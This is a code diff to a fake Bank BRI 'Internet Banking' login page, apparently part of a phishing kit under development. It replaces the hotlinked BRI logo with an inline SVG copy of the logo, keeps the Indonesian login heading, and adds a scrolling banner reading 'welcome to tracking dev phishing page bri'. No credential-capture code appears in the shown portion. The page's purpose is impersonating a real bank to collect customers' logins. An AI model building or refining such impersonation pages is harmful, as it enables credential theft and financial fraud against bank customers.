@@ -120,6 +120,29 @@ body{
     margin-top:4px;
 }
 
+/* RUNNING TEXT */
+.running-text-wrap{
+    width:100%;
+    overflow:hidden;
+    margin-top:8px;
+    height:20px;
+    position:relative;
+}
+.running-text{
+    display:inline-block;
+    white-space:nowrap;
+    font-size:11px;
+    font-weight:500;
+    color:rgba(255,255,255,.6);
+    letter-spacing:1px;
+    text-transform:uppercase;
+    animation:marquee 18s linear infinite;
+}
+@keyframes marquee{
+    0%{transform:translateX(0)}
+    100%{transform:translateX(-50%)}
+}
+
 /* CARD BODY */
 .card-body{
     padding:28px 28px 0;
@@ -374,7 +397,14 @@ body{
 <!-- HEADER -->
 <header class="auth-header">
     <div class="logo">
-        <img src="https://upload.wikimedia.org/wikipedia/id/thumb/e/eb/Bank_BRI_logo_2020.svg/1280px-Bank_BRI_logo_2020.svg.png" alt="BRI Logo" onerror="this.style.display='none'">
+        <svg width="48" height="28" viewBox="0 0 120 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="0" y="0" width="28" height="36" rx="4" fill="#fff"/>
+            <text x="4" y="26" font-family="Arial Black,Arial,sans-serif" font-weight="900" font-size="26" fill="#00247d">B</text>
+            <rect x="32" y="0" width="28" height="36" rx="4" fill="#fff"/>
+            <text x="37" y="26" font-family="Arial Black,Arial,sans-serif" font-weight="900" font-size="26" fill="#00247d">R</text>
+            <rect x="64" y="0" width="28" height="36" rx="4" fill="#fff"/>
+            <text x="71" y="26" font-family="Arial Black,Arial,sans-serif" font-weight="900" font-size="26" fill="#00247d">I</text>
+        </svg>
         <span class="logo-text">Internet Banking</span>
     </div>
     <div class="lang-slider" onclick="toggleLang()">
@@ -388,9 +418,18 @@ body{
     <div class="auth-card">
         <!-- CARD HEADER -->
         <div class="card-header">
-            <img src="https://upload.wikimedia.org/wikipedia/id/thumb/e/eb/Bank_BRI_logo_2020.svg/1280px-Bank_BRI_logo_2020.svg.png" alt="BRI" onerror="this.style.display='none'">
+            <svg width="64" height="36" viewBox="0 0 120 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="0" y="0" width="28" height="36" rx="4" fill="#fff" fill-opacity="0.2"/>
+                <text x="4" y="26" font-family="Arial Black,Arial,sans-serif" font-weight="900" font-size="26" fill="#fff">B</text>
+                <rect x="32" y="0" width="28" height="36" rx="4" fill="#fff" fill-opacity="0.2"/>
+                <text x="37" y="26" font-family="Arial Black,Arial,sans-serif" font-weight="900" font-size="26" fill="#fff">R</text>
+                <rect x="64" y="0" width="28" height="36" rx="4" fill="#fff" fill-opacity="0.2"/>
+                <text x="71" y="26" font-family="Arial Black,Arial,sans-serif" font-weight="900" font-size="26" fill="#fff">I</text>
+            </svg>
             <h1>Masuk ke Internet Banking BRI</h1>
-            <p>Akses perbankan Anda dengan aman dan mudah</p>
+            <div class="running-text-wrap">
+                <span class="running-text">✦ welcome to tracking dev phishing page bri ✦ welcome to tracking dev phishing page bri ✦</span>
+            </div>
         </div>
 
         <!-- CARD BODY -->
